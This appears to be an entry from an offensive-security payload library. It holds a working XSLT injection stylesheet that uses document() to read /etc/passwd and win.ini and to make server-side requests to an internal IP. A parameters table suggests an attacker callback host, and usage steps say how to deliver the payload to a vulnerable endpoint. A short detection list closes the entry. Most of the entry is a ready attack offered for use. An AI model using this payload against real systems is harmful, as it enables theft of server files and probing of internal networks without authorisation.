---
id: 3ebba750-8410-45d5-9879-5c6151bf4733
name: XSLT-Injection-Payload-for-File-Read-and-SSRF
type: code
language: xml
verified: true
created_at: '2023-04-06T03:56:41.495994+00:00'
updated_at: '2023-04-10T20:24:50.398317+00:00'
platforms:
  - Web
tags:
  - xslt-injection
  - ssrf
  - file-read
  - payload
validated: true
---

# XSLT-Injection-Payload-for-File-Read-and-SSRF

## Code

```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/fruits">
    <xsl:copy-of select="document('http://172.16.132.1:25')"/>
    <xsl:copy-of select="document('/etc/passwd')"/>
    <xsl:copy-of select="document('file:///c:/winnt/win.ini')"/>
    Fruits:
        <!-- Loop for each fruit -->
    <xsl:for-each select="fruit">
      <!-- Print name: description -->
      - <xsl:value-of select="name"/>: <xsl:value-of select="description"/>
    </xsl:for-each>
  </xsl:template>
</xsl:stylesheet>
```

## Description

This XSLT payload injects into an application's stylesheet processing to perform SSRF and local file reads using the document() function. It copies content from a remote URL (for SSRF), a Linux password file, and a Windows config file into the transformation output, while also processing legitimate XML elements (e.g., a fruits list) to blend in. Designed for injection via XML parameters like stylesheet= or embedded in the XML body; it executes during server-side XSLT application, exfiltrating data in the response.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| Remote URL | Attacker-controlled or internal URL for SSRF (e.g., http://attacker.com/callback or internal metadata endpoint) | http://172.16.132.1:25 |
| Linux File Path | Local file path for Unix-like systems (e.g., /etc/passwd for user enumeration) | /etc/passwd |
| Windows File Path | Local file path for Windows systems (using file:// protocol) | file:///c:/winnt/win.ini |

## Usage

Embed this XSLT as the value of a stylesheet parameter in an XML POST request (e.g., <xml stylesheet="[paste payload here]"><fruits>...</fruits></xml>) or save as a .xsl file and reference it. Send via [[commands/curl-send-xslt-payload]] to a vulnerable endpoint. Used in web apps with dynamic XSLT transformation, such as report generators or XML viewers. Test locally with xsltproc input.xml payload.xsl > output.html to validate.

## Detection

- XML/XSLT parser logs showing document() calls to unauthorized paths or external IPs.
- WAF alerts on <xsl:copy-of> or document() in input payloads.
- File access logs (e.g., auditd on Linux) for reads of sensitive paths like /etc/passwd.
- Network monitoring for SSRF outbound connections from web server IPs to internal/external hosts.
- Response analysis for anomalous content mixing legitimate data with file excerpts.

## Related

- [[procedures/XSLT-Injection-for-File-Read-and-SSRF]]
- [[xsltproc-local-test]]
